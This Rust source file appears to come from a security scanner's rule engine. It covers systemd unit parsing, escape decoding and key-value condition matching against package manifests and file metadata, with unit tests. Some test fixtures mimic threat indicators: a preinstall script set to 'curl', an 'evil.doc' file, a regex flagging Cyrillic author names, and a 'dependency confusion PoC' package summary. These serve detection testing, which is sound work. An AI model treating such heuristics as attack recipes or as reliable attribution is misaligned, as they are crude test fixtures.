    matches!(
        key,
        "after"
            | "before"
            | "wants"
            | "wanted_by"
            | "requires"
            | "required_by"
            | "requisite"
            | "binds_to"
            | "part_of"
            | "upholds"
            | "conflicts"
            | "also"
            | "alias"
            | "documentation"
            | "environment_file"
            | "pass_environment"
            | "unset_environment"
            | "read_write_paths"
            | "read_only_paths"
            | "inaccessible_paths"
            | "exec_paths"
            | "no_exec_paths"
            | "supplementary_groups"
            | "capability_bounding_set"
            | "ambient_capabilities"
            | "restrict_address_families"
            | "system_call_filter"
            | "system_call_architectures"
    )
}

fn is_systemd_command_key(key: &str) -> bool {
    matches!(
        key,
        "exec_start"
            | "exec_start_pre"
            | "exec_start_post"
            | "exec_reload"
            | "exec_stop"
            | "exec_stop_post"
    )
}

fn is_systemd_multi_value_key(key: &str) -> bool {
    key == "environment" || is_systemd_command_key(key) || is_systemd_token_list_key(key)
}

fn ensure_json_object<'a>(
    map: &'a mut serde_json::Map<String, Value>,
    key: &str,
) -> Option<&'a mut serde_json::Map<String, Value>> {
    if !map.contains_key(key) {
        map.insert(key.to_string(), Value::Object(serde_json::Map::new()));
    }
    map.get_mut(key)?.as_object_mut()
}

fn append_systemd_raw(section_obj: &mut serde_json::Map<String, Value>, key: &str, value: String) {
    if let Some(raw_obj) = ensure_json_object(section_obj, "_raw") {
        append_string_occurrence(raw_obj, key, value);
    }
}

fn append_string_occurrence(map: &mut serde_json::Map<String, Value>, key: &str, value: String) {
    let new_value = Value::String(value);
    match map.get_mut(key) {
        None => {
            map.insert(key.to_string(), new_value);
        }
        Some(Value::Array(arr)) => arr.push(new_value),
        Some(existing) => {
            let old = std::mem::replace(existing, Value::Null);
            *existing = Value::Array(vec![old, new_value]);
        }
    }
}

fn append_string_items<I>(map: &mut serde_json::Map<String, Value>, key: &str, items: I)
where
    I: IntoIterator<Item = String>,
{
    for item in items {
        append_string_occurrence(map, key, item);
    }
}

fn clear_systemd_key(section_obj: &mut serde_json::Map<String, Value>, key: &str) {
    section_obj.remove(key);
    if key == "environment" {
        section_obj.remove("environment_list");
        section_obj.remove("environment");
    }

    if let Some(raw_obj) = section_obj.get_mut("_raw").and_then(Value::as_object_mut) {
        raw_obj.remove(key);
        if raw_obj.is_empty() {
            section_obj.remove("_raw");
        }
    }
}

fn split_systemd_items(input: &str) -> Vec<String> {
    let mut items = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut chars = input.chars().peekable();
    let mut in_item = false;

    while let Some(ch) = chars.next() {
        match quote {
            Some(expected) => {
                if ch == expected {
                    quote = None;
                } else if ch == '\\' {
                    push_systemd_escape(&mut current, &mut chars);
                } else {
                    current.push(ch);
                }
                in_item = true;
            }
            None => match ch {
                ' ' | '\t' => {
                    if in_item {
                        items.push(std::mem::take(&mut current));
                        in_item = false;
                    }
                }
                '"' | '\'' if current.is_empty() => {
                    quote = Some(ch);
                    in_item = true;
                }
                '\\' => {
                    push_systemd_escape(&mut current, &mut chars);
                    in_item = true;
                }
                _ => {
                    current.push(ch);
                    in_item = true;
                }
            },
        }
    }

    if in_item {
        items.push(current);
    }

    items
}

fn push_systemd_escape(out: &mut String, chars: &mut std::iter::Peekable<std::str::Chars<'_>>) {
    let Some(next) = chars.next() else {
        out.push('\\');
        return;
    };

    match next {
        'a' => out.push('\u{0007}'),
        'b' => out.push('\u{0008}'),
        'f' => out.push('\u{000C}'),
        'n' => out.push('\n'),
        'r' => out.push('\r'),
        't' => out.push('\t'),
        'v' => out.push('\u{000B}'),
        '\\' => out.push('\\'),
        '"' => out.push('"'),
        '\'' => out.push('\''),
        's' => out.push(' '),
        'x' => push_radix_escape(out, chars, 16, 2, 'x'),
        'u' => push_unicode_escape(out, chars, 4, 'u'),
        'U' => push_unicode_escape(out, chars, 8, 'U'),
        '0'..='7' => push_octal_escape(out, chars, next),
        other => out.push(other),
    }
}

fn push_radix_escape(
    out: &mut String,
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    radix: u32,
    max_digits: usize,
    fallback_prefix: char,
) {
    let mut digits = String::new();
    while digits.len() < max_digits {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        if next.is_digit(radix) {
            digits.push(next);
            chars.next();
        } else {
            break;
        }
    }

    if digits.is_empty() {
        out.push(fallback_prefix);
        return;
    }

    if let Ok(value) = u32::from_str_radix(&digits, radix)
        && let Some(decoded) = char::from_u32(value)
    {
        out.push(decoded);
        return;
    }

    out.push(fallback_prefix);
    out.push_str(&digits);
}

fn push_unicode_escape(
    out: &mut String,
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    digits: usize,
    fallback_prefix: char,
) {
    let mut buf = String::new();
    while buf.len() < digits {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        if next.is_ascii_hexdigit() {
            buf.push(next);
            chars.next();
        } else {
            break;
        }
    }

    if buf.len() != digits {
        out.push(fallback_prefix);
        out.push_str(&buf);
        return;
    }

    if let Ok(value) = u32::from_str_radix(&buf, 16)
        && let Some(decoded) = char::from_u32(value)
    {
        out.push(decoded);
        return;
    }

    out.push(fallback_prefix);
    out.push_str(&buf);
}

fn push_octal_escape(
    out: &mut String,
    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
    first: char,
) {
    let mut digits = String::new();
    digits.push(first);
    while digits.len() < 3 {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        if ('0'..='7').contains(&next) {
            digits.push(next);
            chars.next();
        } else {
            break;
        }
    }

    if let Ok(value) = u32::from_str_radix(&digits, 8)
        && let Some(decoded) = char::from_u32(value)
    {
        out.push(decoded);
        return;
    }

    out.push_str(&digits);
}

pub(crate) fn structured_format_from_file_type(
    file_type: &crate::composite_rules::FileType,
) -> StructuredFormat {
    match file_type {
        crate::composite_rules::FileType::PackageJson
        | crate::composite_rules::FileType::PackageLockJson
        | crate::composite_rules::FileType::ComposerJson
        | crate::composite_rules::FileType::ChromeManifest => StructuredFormat::Json,
        crate::composite_rules::FileType::CargoToml
        | crate::composite_rules::FileType::PyProjectToml => StructuredFormat::Toml,
        crate::composite_rules::FileType::GithubActions => StructuredFormat::Yaml,
        crate::composite_rules::FileType::Plist => StructuredFormat::Plist,
        crate::composite_rules::FileType::PkgInfo => StructuredFormat::PkgInfo,
        crate::composite_rules::FileType::SystemdService => StructuredFormat::SystemdService,
        crate::composite_rules::FileType::DesktopEntry => StructuredFormat::DesktopEntry,
        crate::composite_rules::FileType::Xml => StructuredFormat::Xml,
        _ => StructuredFormat::Unknown,
    }
}

/// Parse structured file content into a generic JSON value.
///
/// Uses filename/magic-byte detection to pick a format, then runs the matching
/// parser. Returns the detected format alongside the parsed value so callers
/// can distinguish parse failures from unsupported formats.
#[must_use]
pub(crate) fn parse_structured_content(
    path: &Path,
    content: &[u8],
) -> Option<(StructuredFormat, Value)> {
    let format = detect_format(path, content);
    let value = match format {
        StructuredFormat::Json => serde_json::from_slice(content).ok()?,
        StructuredFormat::Yaml => serde_yaml::from_slice(content).ok()?,
        StructuredFormat::Toml => std::str::from_utf8(content)
            .ok()
            .and_then(|s| toml::from_str(s).ok())?,
        StructuredFormat::Plist => plist::from_bytes(content).ok()?,
        StructuredFormat::PkgInfo => parse_pkginfo(content)?,
        StructuredFormat::SystemdService => parse_systemd_service(content)?,
        StructuredFormat::DesktopEntry => parse_desktop_entry(content)?,
        StructuredFormat::Xml => parse_xml_to_json(content)?,
        StructuredFormat::Unknown => return None,
    };
    Some((format, value))
}

/// Evaluate a kv condition against file content using cached format detection and parsing.
///
/// Returns Some(Evidence) if the condition matches, None otherwise.
#[must_use]
pub(crate) fn evaluate_kv(condition: &Condition, ctx: &EvaluationContext<'_>) -> Option<Evidence> {
    let _mp = crate::mem_profile::phase(crate::mem_profile::Phase::EvalKv);
    let Condition::Kv(KvQuery {
        path,
        exact,
        substr,
        regex: _,
        eq,
        ne,
        match_mode,
        case_insensitive,
        exists,
        length_min,
        length_max,
        is_check,
        not,
    }) = condition
    else {
        return None;
    };

    // Cross-fact eq/ne comparison. When either is set, the matcher is
    // strictly path-vs-path: left and right are both value-tree paths,
    // optionally `<filename>::` qualified to reach a sibling archive
    // entry. Always case-insensitive + whitespace-trimmed; if you need
    // strict matching, use `exact:` against a literal.
    if eq.is_some() || ne.is_some() {
        return evaluate_kv_eq_ne(path, eq.as_deref(), ne.as_deref(), *match_mode, ctx);
    }

    // Get the string regex pattern for debug
    let regex_str = if let Condition::Kv(KvQuery { regex, .. }) = condition {
        regex.clone()
    } else {
        None
    };

    let file_path = std::path::Path::new(&ctx.report.target.path);
    let content = ctx.binary_data;

    // Navigate path
    let segments = parse_path(path).ok()?;
    let mut values = Vec::new();

    // Files whose metadata isn't natively a manifest format (office
    // documents, PDFs, filefacts-backed formats, etc.) can have a synthetic
    // kv tree stashed on `report.values_tree`. Consult it first, but do not
    // let it shadow the native parser for structured text formats. PKG-INFO
    // is the motivating edge case: filefacts preserves header casing, while
    // cleave's parser normalizes keys for stable lowercase rule paths.
    if let Some(synthetic) = ctx.report.values_tree.as_ref() {
        values.extend(navigate(synthetic.as_ref(), &segments));
    }

    let detected_format = ctx
        .cached_kv_format
        .get_or_init(|| detect_format(file_path, content));
    let format = if *detected_format == StructuredFormat::Unknown {
        structured_format_from_file_type(&ctx.file_type)
    } else {
        *detected_format
    };

    if format != StructuredFormat::Unknown {
        let cached = ctx.cached_kv_parsed.get_or_init(|| {
            let parsed_value: Option<Value> = match format {
                StructuredFormat::Json => serde_json::from_slice(content).ok(),
                StructuredFormat::Yaml => serde_yaml::from_slice(content).ok(),
                StructuredFormat::Toml => std::str::from_utf8(content)
                    .ok()
                    .and_then(|s| toml::from_str(s).ok()),
                StructuredFormat::Plist => plist::from_bytes(content).ok(),
                StructuredFormat::PkgInfo => parse_pkginfo(content),
                StructuredFormat::SystemdService => parse_systemd_service(content),
                StructuredFormat::DesktopEntry => parse_desktop_entry(content),
                StructuredFormat::Xml => parse_xml_to_json(content),
                StructuredFormat::Unknown => None,
            };
            Box::new(parsed_value.unwrap_or(Value::Null))
        });
        if !cached.is_null() {
            values.extend(navigate(cached.as_ref(), &segments));
        }
    }

    if values.is_empty() && ctx.report.values_tree.is_none() && format == StructuredFormat::Unknown
    {
        return None;
    }

    // Handle exists check
    let path_found = !values.is_empty();
    if let Some(should_exist) = exists {
        if *should_exist && !path_found {
            // exists: true but path not found - no match
            return None;
        }
        if !*should_exist && path_found {
            // exists: false but path found - no match
            return None;
        }
        if !*should_exist && !path_found {
            // exists: false and path not found - match!
            return Some(Evidence {
                method: "value".to_string(),
                source: file_path.display().to_string(),
                value: format!("field '{}' does not exist", path),
                location: Some(format!("value:{}", path)),
                ..Default::default()
            });
        }
    }

    if values.is_empty() {
        return None; // Path not found
    }

    // Resolve the regex once: compiled lazily + shared via `lazy_regex` (applies
    // `(?i)` when case-insensitive) rather than stored per condition.
    let resolved_regex_owned: Option<
        std::sync::Arc<crate::composite_rules::condition::TraitRegex>,
    > = regex_str
        .as_deref()
        .and_then(|r| crate::composite_rules::condition::lazy_regex(Some(r), *case_insensitive));
    let resolved_regex = resolved_regex_owned.as_ref();

    // Build matcher
    let mut matcher = KvMatcher::new(
        exact.as_ref(),
        substr.as_ref(),
        resolved_regex,
        *case_insensitive,
        *exists,
        *length_min,
        *length_max,
    );
    matcher.is_check = *is_check;
    matcher.not = not.clone().unwrap_or_default();

    // Check if any value matches
    for value in &values {
        if matcher.matches(value) {
            let matched_value = format_evidence_value_with_size(value, *length_min, *length_max);
            return Some(Evidence {
                method: "value".to_string(),
                source: file_path.display().to_string(),
                value: matched_value,
                location: Some(kv_location(path, &segments, format, content, ctx)),
                ..Default::default()
            });
        }
    }

    None
}

/// Resolve the evidence location for a matched kv path so the finding anchors
/// where the matched data sits. Two sources, in order:
///
/// 1. The per-file key-offset index for JSON content (built once, cached) — the
///    matched key's byte position in package.json and friends.
/// 2. A `<path>_offset` companion in the value tree — filefacts's existing idiom
///    for structural facts it parsed from a binary (e.g. `macho.uuid` carries a
///    sibling `macho.uuid_offset`). A `value` always comes from a real place in
///    the file, unlike a `metric`, so this is where binary-fact matches anchor.
///
/// Falls back to the semantic `value:<path>` label only when neither resolves.
fn kv_location(
    path: &str,
    segments: &[PathSegment],
    format: StructuredFormat,
    content: &[u8],
    ctx: &EvaluationContext<'_>,
) -> String {
    let dotted = segments_dotted(segments);
    let offsets = ctx.cached_kv_offsets.get_or_init(|| {
        // Only JSON is indexed: package.json is the dominant supply-chain
        // workload and the win is measured. Other structured formats fall back
        // to the value-tree companion or the label — no hand-rolled re-scanner
        // per format (see docs/BINARY_METADATA_ANCHORING.md).
        if format == StructuredFormat::Json {
            std::str::from_utf8(content)
                .map(build_json_key_offsets)
                .unwrap_or_default()
        } else {
            FxHashMap::default()
        }
    });
    if let Some(off) = offsets.get(&dotted) {
        return format!("offset:{off}");
    }
    if let Some(off) = value_tree_companion_offset(ctx, &dotted) {
        return format!("offset:{off}");
    }
    format!("value:{path}")
}

/// Look up a `<path>_offset` sibling in the parsed value tree — filefacts records
/// the source byte offset of a structural fact next to the fact itself. Returns
/// `None` when there's no companion (the fact carries no single location).
fn value_tree_companion_offset(ctx: &EvaluationContext<'_>, dotted_path: &str) -> Option<u64> {
    let tree = ctx.report.values_tree.as_ref()?;
    let segments = parse_path(&format!("{dotted_path}_offset")).ok()?;
    navigate(tree.as_ref(), &segments).first()?.as_u64()
}

/// Format a value for evidence display with optional size information.
fn format_evidence_value_with_size(
    value: &Value,
    length_min: Option<usize>,
    length_max: Option<usize>,
) -> String {
    let s = match value {
        Value::String(s) => s.clone(),
        Value::Array(arr) => {
            // Format array elements
            let items: Vec<String> = arr.iter().map(value_to_string).collect();
            format!("[{}]", items.join(", "))
        }
        _ => value_to_string(value),
    };

    // Truncate if too long
    let truncated = if s.len() > 200 {
        format!("{}...", &s[..s.floor_char_boundary(197)])
    } else {
        s
    };

    // Only annotate size when the rendered form hides the count: a
    // truncated string, or an object (rendered without bracket-count
    // cues). Arrays render as `[a, b, c]` — the reader counts items.
    let size_info = if length_min.is_some() || length_max.is_some() {
        match value {
            Value::Array(arr) if truncated.ends_with("...") => {
                Some(format!("size: {} (array)", arr.len()))
            }
            Value::Object(obj) => Some(format!("size: {} (object)", obj.len())),
            _ => None,
        }
    } else {
        None
    };

    match size_info {
        Some(info) => format!("{} ({})", truncated, info),
        None => truncated,
    }
}

/// Format a value for evidence display (truncated if necessary).
#[allow(dead_code)]
fn format_evidence_value(value: &Value) -> String {
    format_evidence_value_with_size(value, None, None)
}

/// Path-vs-path equality / inequality. Both sides accept the optional
/// `<filename>::` prefix to reach a sibling archive entry's value tree.
/// Comparison is always case-insensitive and whitespace-trimmed; for
/// strict-string matching use `exact:` against a literal.
fn evaluate_kv_eq_ne(
    left_path: &str,
    eq: Option<&str>,
    ne: Option<&str>,
    quant: ArrayQuantifier,
    ctx: &EvaluationContext<'_>,
) -> Option<Evidence> {
    let right_path = eq.or(ne)?;
    let want_equal = eq.is_some();

    // Either side may resolve to multiple values — a bare array (`pkg.foo`) or
    // a wildcard path (`pkg.foo[*]`). For each right value we ask whether SOME
    // left value satisfies the relation (`==` for eq, `!=` for ne); the
    // quantifier then decides whether that must hold for `any` right value
    // (default) or for `all` of them. The common scalar-vs-scalar case has one
    // value per side, so both quantifiers reduce to a plain compare and existing
    // rules are unaffected. The array case is the new capability — e.g. a
    // package's declared owner `ne` its source-repo owners with `match: any`
    // fires when ANY source owner differs (fork impersonation), while `match:
    // all` would require every source to differ.
    let left: Vec<String> = resolve_all_values(left_path, ctx)
        .into_iter()
        .filter_map(value_as_normalized_string)
        .collect();
    let right: Vec<String> = resolve_all_values(right_path, ctx)
        .into_iter()
        .filter_map(value_as_normalized_string)
        .collect();

    // A missing/empty side leaves the comparison undefined — no match. (Combine
    // with `exists:` in a separate condition for "present here, absent there".)
    if left.is_empty() || right.is_empty() {
        return None;
    }

    let satisfied = |r: &String| {
        left.iter()
            .any(|l| if want_equal { l == r } else { l != r })
    };
    let fired = match quant {
        ArrayQuantifier::Any => right.iter().any(satisfied),
        ArrayQuantifier::All => right.iter().all(satisfied),
    };
    if !fired {
        return None;
    }

    let op = if want_equal { "==" } else { "!=" };
    Some(Evidence {
        method: "value".to_string(),
        source: ctx.report.target.path.clone(),
        value: format!("{left_path} {op} {right_path}"),
        location: Some(format!("value:{left_path}")),
        ..Default::default()
    })
}

/// Append a value to `out`, flattening one array level so a bare array path
/// and a `[*]` wildcard path both contribute their scalar elements.
fn push_flat(out: &mut Vec<Value>, v: &Value) {
    match v {
        Value::Array(arr) => out.extend(arr.iter().cloned()),
        other => out.push(other.clone()),
    }
}

/// Resolve every value at `qualified_path`, optionally crossing into a sibling
/// archive entry's value tree via the `<filename>::` prefix. Arrays are
/// flattened one level (see [`push_flat`]) so eq/ne can quantify over their
/// elements.
fn resolve_all_values(qualified_path: &str, ctx: &EvaluationContext<'_>) -> Vec<Value> {
    let (sibling, path) = split_qualified_path(qualified_path);
    let Ok(segments) = parse_path(path) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    match sibling {
        None => {
            // Current file: the synthetic values_tree the analyzer attached to
            // the report (filefacts-emitted values for binaries and manifests).
            if let Some(tree) = ctx.report.values_tree.as_ref() {
                for v in navigate(tree.as_ref(), &segments) {
                    push_flat(&mut out, v);
                }
            }
        }
        Some(name) => {
            // Sibling archive entry: first `report.files[]` whose basename
            // matches (case-insensitive). Reads the already-flattened `file.kv`,
            // which is always present even when members fold into the container.
            //
            // A member's kv has been through `flatten_kv_for_output`, so it is
            // a different representation from the `values_tree` the same-file
            // branch navigates above — one that spells an array as indexed keys
            // and cannot store it whole. Read it through the accessor that sits
            // beside the flattening rather than open-coding a `get` here: an
            // exact lookup resolves scalars and silently misses every array,
            // which is why `README.md::markdown.first_heading` worked while
            // `README.md::markdown.npm_packages` never matched anything.
            // Shallowest match wins, not first-in-file-order. An archive that
            // vendors its dependencies holds several `README.md` and
            // `package.json` entries, and file order is an artifact of how the
            // container was written — so first-match let the two halves of a
            // cross-file comparison come from *different* packages
            // (`node_modules/debug/README.md` answering for the root manifest).
            // The entry that speaks for the archive is the one nearest its root.
            if let Some(file) = ctx
                .report
                .files
                .iter()
                .filter(|f| sibling_path_matches(&f.path, name))
                .min_by_key(|f| {
                    f.path
                        .bytes()
                        .filter(|b| matches!(b, b'/' | b'\\' | b'!'))
                        .count()
                })
            {
                for v in crate::types::core::kv_lookup_flattened(&file.kv, path) {
                    push_flat(&mut out, v);
                }
            }
        }
    }
    out
}

/// True when `entry_path` (an archive-internal path like
/// `package/package.json` or `foo!bar.so`) refers to a file whose
/// final path component equals `target` (case-insensitive).
fn sibling_path_matches(entry_path: &str, target: &str) -> bool {
    let basename = entry_path
        .rsplit(['/', '\\', '!'])
        .next()
        .unwrap_or(entry_path);
    basename.eq_ignore_ascii_case(target)
}

/// Render a JSON value as a normalized string for eq/ne comparison.
/// Strings, numbers, and bools all reduce cleanly. Containers (arrays
/// and objects) and null return `None` — the comparison is
/// scalar-only by design.
fn value_as_normalized_string(value: Value) -> Option<String> {
    let raw = match value {
        Value::String(s) => s,
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        _ => return None,
    };
    Some(raw.trim().to_lowercase())
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    use super::*;
    use crate::composite_rules::context::EvaluationContext;
    use crate::composite_rules::types::FileType;
    use crate::types::{AnalysisReport, TargetInfo};
    use serde_json::json;

    #[test]
    fn json_key_offsets_indexes_nested_paths() {
        let doc = r#"{"name":"x","scripts":{"preinstall":"curl"},"deps":{"a":"1"}}"#;
        let m = build_json_key_offsets(doc);
        let at = |needle: &str| doc.find(needle).map(|p| p as u64);
        assert_eq!(m.get("name").copied(), at("\"name\""));
        assert_eq!(m.get("scripts").copied(), at("\"scripts\""));
        assert_eq!(m.get("scripts.preinstall").copied(), at("\"preinstall\""));
        assert_eq!(m.get("deps.a").copied(), at("\"a\""));
        // Nested keys are addressable only by their full dotted path.
        assert_eq!(m.get("a"), None);
        assert_eq!(m.get("preinstall"), None);
    }

    #[test]
    fn json_key_offsets_arrays_are_transparent() {
        let doc = r#"{"content_scripts":[{"matches":"<all_urls>"}]}"#;
        let m = build_json_key_offsets(doc);
        // Array nesting is skipped so the dotted path lines up with trait paths
        // like `content_scripts[*].matches`.
        assert_eq!(
            m.get("content_scripts.matches").copied(),
            doc.find("\"matches\"").map(|p| p as u64)
        );
        assert_eq!(
            segments_dotted(&parse_path("content_scripts[*].matches").unwrap()),
            "content_scripts.matches"
        );
    }

    /// Helper to create evaluation context for testing
    fn create_test_ctx<'a>(
        binary_data: &'a [u8],
        path: &'a std::path::Path,
    ) -> EvaluationContext<'a> {
        create_test_ctx_with_file_type(binary_data, path, FileType::All)
    }

    fn create_test_ctx_with_file_type<'a>(
        binary_data: &'a [u8],
        path: &'a std::path::Path,
        file_type: FileType,
    ) -> EvaluationContext<'a> {
        // Create minimal report with the path we need
        let report = Box::leak(Box::new(AnalysisReport::new(TargetInfo {
            path: path.display().to_string(),
            file_type: "test".to_string(),
            size_bytes: binary_data.len() as u64,
            sha256: "test".to_string(),
            architectures: None,
        })));

        EvaluationContext::test_only_new(report, binary_data, file_type)
    }

    /// Test wrapper for evaluate_kv that creates context automatically
    fn evaluate_kv_test(
        condition: &Condition,
        data: &[u8],
        path: &std::path::Path,
    ) -> Option<Evidence> {
        let ctx = create_test_ctx(data, path);
        evaluate_kv(condition, &ctx)
    }

    /// Build a test context whose report carries a synthetic kv tree —
    /// the path the office analyzer takes when stashing
    /// `report.values_tree`. Used by `synthetic_values_tree_*` tests below.
    fn create_test_ctx_with_values_tree<'a>(
        binary_data: &'a [u8],
        path: &'a std::path::Path,
        file_type: FileType,
        values_tree: serde_json::Value,
    ) -> EvaluationContext<'a> {
        let mut report = AnalysisReport::new(TargetInfo {
            path: path.display().to_string(),
            file_type: "test".to_string(),
            size_bytes: binary_data.len() as u64,
            sha256: "test".to_string(),
            architectures: None,
        });
        report.values_tree = Some(Box::new(values_tree));
        let leaked: &'static AnalysisReport = Box::leak(Box::new(report));
        EvaluationContext::test_only_new(leaked, binary_data, file_type)
    }

    /// `report.values_tree` is consulted in preference to the file's
    /// own structured-format parsing — even when the binary is empty.
    #[test]
    fn synthetic_values_tree_resolves_paths_for_office() {
        let kv = serde_json::json!({
            "summary": {
                "author": "Иван Иванов",
                "create_time": "2025-03-12T10:30:00Z",
                "revision": 1,
            },
            "ole": {
                "compobj": {
                    "app_version": "Excel.Sheet.8",
                },
            },
        });
        let path = std::path::Path::new("evil.doc");
        let ctx = create_test_ctx_with_values_tree(&[], path, FileType::All, kv);

        // Cyrillic-author regex fires.
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "summary.author".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"[Ѐ-ӿ]".to_string()),
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv(&cond, &ctx).is_some());

        // Excel.Sheet.8 in compobj fires.
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "ole.compobj.app_version".to_string(),
            exact: None,
            substr: Some("Excel.".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv(&cond, &ctx).is_some());

        // Path that doesn't exist returns None.
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "summary.title".to_string(),
            exact: Some("anything".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    #[test]
    fn native_pkginfo_parser_still_applies_with_synthetic_values_tree() {
        let pkginfo = b"Metadata-Version: 2.4
Name: tap-wordpress
Summary: Security research - dependency confusion PoC
Author-email: security-research@example.com
";
        let kv = serde_json::json!({
            "Summary": "Security research - dependency confusion PoC",
            "Author-email": "security-research@example.com",
        });
        let path = std::path::Path::new("METADATA");
        let ctx = create_test_ctx_with_values_tree(pkginfo, path, FileType::PkgInfo, kv);

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "summary".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"dependency.confusion".to_string()),
            eq: None,
            ne: None,
            case_insensitive: true,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv(&cond, &ctx).is_some());
    }

    fn evaluate_kv_test_with_file_type(
        condition: &Condition,
        data: &[u8],
        path: &std::path::Path,
        file_type: FileType,
    ) -> Option<Evidence> {
        let ctx = create_test_ctx_with_file_type(data, path, file_type);
        evaluate_kv(condition, &ctx)
    }

    // ==========================================================================
    // Path Parsing Tests
    // ==========================================================================

    #[test]
    fn test_path_simple_key() {
        assert_eq!(
            parse_path("permissions").unwrap(),
            vec![PathSegment::Key("permissions".to_string())]
        );
    }

    /// macOS entitlement keys are dotted OIDs that can't be expressed
    /// with the bare-dot path syntax (`a.b.c` would split into three
    /// segments). The bracketed-quoted-string form lets a trait
    /// navigate `macho.code_signature.entitlements["com.apple.security.cs.disable-library-validation"]`
    /// — the quoted key is taken as one literal segment.
    #[test]
    fn test_path_quoted_key_holds_dotted_string() {
        let parsed = parse_path(
            r#"macho.code_signature.entitlements["com.apple.security.cs.disable-library-validation"]"#,
        )
        .unwrap();
        assert_eq!(
            parsed,
            vec![
                PathSegment::Key("macho".into()),
                PathSegment::Key("code_signature".into()),
                PathSegment::Key("entitlements".into()),
                PathSegment::Key("com.apple.security.cs.disable-library-validation".into(),),
            ],
        );
    }

    /// Single-quote form parses identically to double-quote form.
    #[test]
    fn test_path_quoted_key_accepts_single_quotes() {
        let parsed = parse_path("entitlements['com.apple.security.get-task-allow']").unwrap();
        assert_eq!(
            parsed,
            vec![
                PathSegment::Key("entitlements".into()),
                PathSegment::Key("com.apple.security.get-task-allow".into()),
            ],
        );
    }

    /// A quoted key can follow another quoted key without a leading
    /// dot — the `]` terminates the previous segment and the next `[`
    /// starts a new one.
    #[test]
    fn test_path_chained_quoted_keys() {
        let parsed = parse_path(r#"foo["a.b"]["c.d"]"#).unwrap();
        assert_eq!(
            parsed,
            vec![
                PathSegment::Key("foo".into()),
                PathSegment::Key("a.b".into()),
                PathSegment::Key("c.d".into()),
            ],
        );
    }

    #[test]
    fn test_path_quoted_key_rejects_unterminated() {
        assert!(parse_path(r#"foo["bar"#).is_err());
    }

    #[test]
    fn test_path_quoted_key_rejects_missing_close_bracket() {
        // The agent walks until the closing quote, then expects `]`
        // immediately. A stray char between the close-quote and the
        // close-bracket is malformed.
        assert!(parse_path(r#"foo["bar"x]"#).is_err());
    }

    /// Quoted-key navigation: an entitlements object keyed on dotted
    /// OIDs is reachable via the bracketed-string form. Bare dot
    /// syntax would erroneously split the OID.
    #[test]
    fn test_navigate_quoted_key_reaches_dotted_entitlement_oid() {
        let v: Value = serde_json::from_str(
            r#"{
              "macho": {
                "code_signature": {
                  "entitlements": {
                    "com.apple.security.cs.disable-library-validation": true,
                    "com.apple.security.get-task-allow": false
                  }
                }
              }
            }"#,
        )
        .unwrap();
        let segs = parse_path(
            r#"macho.code_signature.entitlements["com.apple.security.cs.disable-library-validation"]"#,
        )
        .unwrap();
        let hits = navigate(&v, &segs);
        assert_eq!(hits, vec![&Value::Bool(true)]);
    }

    #[test]
    fn test_path_nested() {
        assert_eq!(
            parse_path("scripts.postinstall").unwrap(),
            vec![
                PathSegment::Key("scripts".to_string()),
                PathSegment::Key("postinstall".to_string())
            ]
        );
    }

    #[test]
    fn test_path_array_index() {
        assert_eq!(
            parse_path("content_scripts[0].matches").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Index(0),
                PathSegment::Key("matches".to_string())
            ]
        );
    }

    #[test]
    fn test_path_wildcard() {
        assert_eq!(
            parse_path("content_scripts[*].matches").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Wildcard,
                PathSegment::Key("matches".to_string())
            ]
        );
    }

    #[test]
    fn test_path_object_wildcard() {
        assert_eq!(
            parse_path("dependencies.*").unwrap(),
            vec![
                PathSegment::Key("dependencies".to_string()),
                PathSegment::Wildcard
            ]
        );
    }

    #[test]
    fn test_path_deep_nesting() {
        assert_eq!(
            parse_path("a.b.c.d.e").unwrap(),
            vec![
                PathSegment::Key("a".to_string()),
                PathSegment::Key("b".to_string()),
                PathSegment::Key("c".to_string()),
                PathSegment::Key("d".to_string()),
                PathSegment::Key("e".to_string())
            ]
        );
    }

    #[test]
    fn test_path_multiple_wildcards() {
        assert_eq!(
            parse_path("content_scripts[*].matches[*]").unwrap(),
            vec![
                PathSegment::Key("content_scripts".to_string()),
                PathSegment::Wildcard,
                PathSegment::Key("matches".to_string()),
                PathSegment::Wildcard
            ]
        );
    }

    #[test]
    fn test_path_key_with_hyphen() {
        assert_eq!(
            parse_path("dev-dependencies.serde").unwrap(),
            vec![
                PathSegment::Key("dev-dependencies".to_string()),
                PathSegment::Key("serde".to_string())
            ]
        );
    }

    #[test]
    fn test_path_empty() {
        assert!(parse_path("").is_err());
    }

    // ==========================================================================
    // Navigation Tests
    // ==========================================================================

    #[test]
    fn test_navigate_simple() {
        let json = json!({"permissions": ["a", "b"]});
        let segments = parse_path("permissions").unwrap();
        let values = navigate(&json, &segments);
        assert_eq!(values, vec![&json!(["a", "b"])]);
    }

    #[test]
    fn test_navigate_nested() {
        let json = json!({"scripts": {"postinstall": "npm build"}});
